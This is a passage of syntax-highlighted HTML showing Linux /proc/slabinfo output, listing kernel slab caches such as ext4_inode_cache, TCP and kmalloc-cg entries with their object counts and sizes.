class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ecryptfs_inode_cache      <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">ecryptfs_file_cache      <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">ecryptfs_auth_tok_list_item      <span class="number">0</span>      <span class="number">0</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">00</span></span><br><span class="line">fat_inode_cache       <span class="number">42</span>     <span class="number">42</span>    <span class="number">776</span>   <span class="number">42</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fat_cache              <span class="number">0</span>      <span class="number">0</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">squashfs_inode_cache    <span class="number">552</span>    <span class="number">552</span>    <span class="number">704</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">jbd2_journal_head   <span class="number">2312</span>   <span class="number">2380</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">jbd2_revoke_table_s    <span class="number">256</span>    <span class="number">256</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">ext4_fc_dentry_update      <span class="number">0</span>      <span class="number">0</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">ext4_inode_cache   <span class="number">49680</span>  <span class="number">49680</span>   <span class="number">1176</span>   <span class="number">27</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_allocation_context    <span class="number">448</span>    <span class="number">448</span>    <span class="number">144</span>   <span class="number">28</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span></span><br><span class="line">ext4_io_end         <span class="number">1152</span>   <span class="number">1152</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_pending_reservation   <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>   <span class="number">0</span></span><br><span class="line">ext4_extent_status  <span class="number">44133</span>  <span class="number">44268</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">mbcache             <span class="number">4088</span>   <span class="number">4088</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kioctx                 <span class="number">0</span>      <span class="number">0</span>    <span class="number">576</span>   <span class="number">28</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">userfaultfd_ctx_cache      <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">dnotify_struct         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pid_namespace         <span class="number">90</span>     <span class="number">90</span>    <span class="number">136</span>   <span class="number">30</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">UNIX                <span class="number">1140</span>   <span class="number">1140</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip4-frags              <span class="number">0</span>      <span class="number">0</span>    <span class="number">200</span>   <span class="number">40</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">MPTCP                  <span class="number">0</span>      <span class="number">0</span>   <span class="number">1920</span>   <span class="number">17</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_subflow      <span class="number">0</span>      <span class="number">0</span>    <span class="number">376</span>   <span class="number">43</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">xfrm_dst_cache         <span class="number">0</span>      <span class="number">0</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">xfrm_state             <span class="number">0</span>      <span class="number">0</span>    <span class="number">768</span>   <span class="number">42</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip_fib_trie          <span class="number">935</span>    <span class="number">935</span>     <span class="number">48</span>   <span class="number">85</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip_fib_alias         <span class="number">876</span>    <span class="number">876</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">PING                   <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">RAW                 <span class="number">1728</span>   <span class="number">1728</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">tw_sock_TCP          <span class="number">297</span>    <span class="number">297</span>    <span class="number">248</span>   <span class="number">33</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_TCP     <span class="number">286</span>    <span class="number">286</span>    <span class="number">304</span>   <span class="number">26</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">TCP                  <span class="number">224</span>    <span class="number">224</span>   <span class="number">2240</span>   <span class="number">14</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">hugetlbfs_inode_cache    <span class="number">168</span>    <span class="number">168</span>    <span class="number">664</span>   <span class="number">24</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">dquot                <span class="number">512</span>    <span class="number">512</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ep_head             <span class="number">4096</span>   <span class="number">4096</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dax_cache             <span class="number">39</span>     <span class="number">39</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">bio_crypt_ctx        <span class="number">306</span>    <span class="number">306</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_queue        <span class="number">105</span>    <span class="number">105</span>   <span class="number">2128</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec-max           <span class="number">304</span>    <span class="number">320</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec<span class="number">-128</span>           <span class="number">256</span>    <span class="number">256</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec<span class="number">-64</span>            <span class="number">512</span>    <span class="number">512</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">khugepaged_mm_slot    <span class="number">216</span>    <span class="number">216</span>    <span class="number">112</span>   <span class="number">36</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">user_namespace       <span class="number">156</span>    <span class="number">156</span>    <span class="number">624</span>   <span class="number">26</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dmaengine-unmap<span class="number">-256</span>     <span class="number">15</span>     <span class="number">15</span>   <span class="number">2112</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">dmaengine-unmap<span class="number">-128</span>     <span class="number">30</span>     <span class="number">30</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">sock_inode_cache    <span class="number">4212</span>   <span class="number">4212</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">skbuff_ext_cache     <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">skbuff_fclone_cache    <span class="number">512</span>    <span class="number">512</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">skbuff_head_cache   <span class="number">2560</span>   <span class="number">2688</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">file_lock_cache      <span class="number">592</span>    <span class="number">592</span>    <span class="number">216</span>   <span class="number">37</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">file_lock_ctx       <span class="number">1168</span>   <span class="number">1168</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fsnotify_mark_connector   <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span></span><br><span class="line">buffer_head       <span class="number">192504</span> <span class="number">192504</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">x86_lbr                <span class="number">0</span>      <span class="number">0</span>    <span class="number">800</span>   <span class="number">40</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">taskstats            <span class="number">736</span>    <span class="number">736</span>    <span class="number">352</span>   <span class="number">46</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">proc_dir_entry      <span class="number">1638</span>   <span class="number">1638</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pde_opener          <span class="number">1632</span>   <span class="number">1632</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">proc_inode_cache   <span class="number">12098</span>  <span class="number">12098</span>    <span class="number">712</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">seq_file             <span class="number">544</span>    <span class="number">544</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">sigqueue            <span class="number">1071</span>   <span class="number">1071</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">bdev_cache           <span class="number">160</span>    <span class="number">160</span>   <span class="number">1600</span>   <span class="number">20</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">shmem_inode_cache   <span class="number">2408</span>   <span class="number">2408</span>    <span class="number">760</span>   <span class="number">43</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kernfs_node_cache  <span class="number">71552</span>  <span class="number">71552</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mnt_cache           <span class="number">2900</span>   <span class="number">2900</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">filp               <span class="number">11820</span>  <span class="number">12096</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">inode_cache        <span class="number">44725</span>  <span class="number">44725</span>    <span class="number">640</span>   <span class="number">25</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dentry            <span class="number">149394</span> <span class="number">149394</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">names_cache          <span class="number">208</span>    <span class="number">208</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">net_namespace         <span class="number">49</span>     <span class="number">49</span>   <span class="number">4352</span>    <span class="number">7</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">iint_cache             <span class="number">0</span>      <span class="number">0</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">lsm_file_cache    <span class="number">123420</span> <span class="number">123420</span>     <span class="number">24</span>  <span class="number">170</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">uts_namespace        <span class="number">222</span>    <span class="number">222</span>    <span class="number">432</span>   <span class="number">37</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">nsproxy              <span class="number">728</span>    <span class="number">728</span>     <span class="number">72</span>   <span class="number">56</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">vm_area_struct     <span class="number">52371</span>  <span class="number">53079</span>    <span class="number">208</span>   <span class="number">39</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mm_struct            <span class="number">780</span>    <span class="number">780</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">files_cache          <span class="number">920</span>    <span class="number">920</span>    <span class="number">704</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">signal_cache        <span class="number">2027</span>   <span class="number">2044</span>   <span class="number">1152</span>   <span class="number">28</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">sighand_cache       <span class="number">1245</span>   <span class="number">1245</span>   <span class="number">2112</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">task_struct         <span class="number">1130</span>   <span class="number">1176</span>   <span class="number">8064</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">cred_jar            <span class="number">6258</span>   <span class="number">6258</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">anon_vma_chain     <span class="number">28659</span>  <span class="number">29184</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">anon_vma           <span class="number">19422</span>  <span class="number">19422</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pid                 <span class="number">3360</span>   <span class="number">3360</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-Operand       <span class="number">11928</span>  <span class="number">11928</span>     <span class="number">72</span>   <span class="number">56</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-ParseExt        <span class="number">429</span>    <span class="number">429</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-State          <span class="number">1326</span>   <span class="number">1326</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">numa_policy          <span class="number">155</span>    <span class="number">155</span>    <span class="number">264</span>   <span class="number">31</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">perf_event            <span class="number">27</span>     <span class="number">27</span>   <span class="number">1192</span>   <span class="number">27</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">trace_event_file    <span class="number">3496</span>   <span class="number">3496</span>     <span class="number">88</span>   <span class="number">46</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ftrace_event_field  <span class="number">13090</span>  <span class="number">13090</span>     <span class="number">48</span>   <span class="number">85</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">pool_workqueue      <span class="number">3392</span>   <span class="number">3392</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">radix_tree_node    <span class="number">23380</span>  <span class="number">23380</span>    <span class="number">584</span>   <span class="number">28</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">task_group           <span class="number">425</span>    <span class="number">425</span>    <span class="number">640</span>   <span class="number">25</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">vmap_area          <span class="number">12359</span>  <span class="number">26624</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-8</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-4</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-2</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-1</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-512</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-256</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-128</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-64</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-32</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-16</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-8</span>          <span class="number">0</span>      <span class="number">0</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-192</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-96</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-8</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-4</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-2</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-1</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-512</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-256</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-192</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-128</span>      <span class="number">800</span>    <span class="number">800</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-96</span>      <span class="number">1386</span>   <span class="number">1386</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-64</span>      <span class="number">5824</span>   <span class="number">5824</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-32</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-16</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-8</span>          <span class="number">0</span>      <span class="number">0</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-8</span>k         <span class="number">60</span>     <span class="number">60</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-4</span>k        <span class="number">192</span>    <span class="number">216</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-2</span>k        <span class="number">272</span>    <span class="number">272</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-1</span>k       <span class="number">1113</span>   <span class="number">1248</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-512</span>      <span class="number">2498</span>   <span class="number">2688</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-256</span>       <span class="number">512</span>    <span class="number">512</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-192</span>       <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span 